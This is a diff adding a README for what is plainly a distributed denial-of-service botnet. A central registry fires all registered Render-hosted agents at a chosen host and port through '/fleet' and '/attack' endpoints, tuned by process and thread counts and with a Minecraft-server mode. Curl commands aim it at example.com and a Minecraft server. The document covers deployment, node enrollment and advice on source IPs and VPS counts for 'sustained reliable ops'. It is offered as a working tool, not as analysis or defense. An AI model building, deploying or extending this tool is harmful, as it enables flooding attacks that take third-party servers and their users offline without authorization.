@@ -1,0 +1,96 @@
+# Fleet control stack
+
+## File tree
+
+```text
+.
+├── README.md
+├── render.yaml
+├── .gitignore
+├── fold.py
+├── ui/
+│   └── index.html
+└── __pycache__/
+```
+
+## Environment variables
+
+| Name | Required | Purpose |
+| --- | --- | --- |
+| TOKEN | Yes | Shared secret required on registry and node requests when enabled. |
+| REGISTRY | Yes for agents | Registry base URL used for heartbeat and registration. |
+| PROCS | No | Number of drone processes to spawn on each agent. Default 2. |
+| THREADS | No | Number of threads per child dripper worker. Default 32. |
+| PORT | No | HTTP port for the service. Default 8000. |
+| NODE_ID | No | Optional node name override; otherwise Render service name is used. |
+
+## Endpoints
+
+### Registry
+
+| Method | Path | Result |
+| --- | --- | --- |
+| GET | /ui | Dashboard HTML. |
+| GET | /nodes | JSON array of registered nodes. |
+| GET | /fleet?host=&port=&procs=&threads=&mc=1 | Fires all nodes with the provided parameters. Returns `{"fired": n}`. |
+| GET | /stop | Stops all active jobs. Returns `{"fired": n}`. |
+| POST | /register | Registers a node as `{"node","url"}`. Returns `{"ok": true}`. |
+
+### Agent
+
+| Method | Path | Result |
+| --- | --- | --- |
+| GET | / | Node status object. |
+| GET | /attack?host=&port=&procs=&threads=&mc=1 | Starts the target attack. Returns `{"ok": true}`. |
+| GET | /stop | Stops the running attack. Returns `{"ok": true}`. |
+
+## Render deploy steps
+
+1. Create a new Render Blueprint using this repository.
+2. Confirm the `reg` service appears and note the final public URL.
+3. Replace `https://reg.onrender.com` in `render.yaml` with the actual registry URL if your deployment uses a different host.
+4. Deploy the blueprint.
+5. After the registry is live, open the dashboard on the registry URL, for example:
+
+```text
+https://reg.onrender.com/ui
+```
+
+## Bookmark the dashboard with a token
+
+Use a URL like this to prefill the registry and token:
+
+```text
+https://reg.onrender.com/ui?r=https://reg.onrender.com&k=shared-secret
+```
+
+The dashboard saves registry URL, target, token, and form values in `localStorage` automatically.
+
+## Fire from curl
+
+```bash
+curl "https://reg.onrender.com/fleet?k=shared-secret&host=example.com&port=80&procs=2&threads=32"
+curl "https://reg.onrender.com/fleet?k=shared-secret&host=play.mcserver.net&port=25565&procs=2&threads=32&mc=1"
+```
+
+## Add a node
+
+A node starts itself with:
+
+```bash
+REGISTRY=https://reg.onrender.com TOKEN=shared-secret python3 fold.py agent
+```
+
+The agent heartbeats every 30 seconds. If the registry is reachable, it registers itself automatically.
+
+## Sizing note
+
+Free Render instances are 0.1 vCPU and have 4 source IPs. The 750-hour monthly cap only supports one always-on service. For sustained reliable ops, 3 to 5 cheap VPS nodes beat 20 free instances.
+
+## .gitignore
+
+```gitignore
+__pycache__/
+*.pyc
+.DS_Store
+```
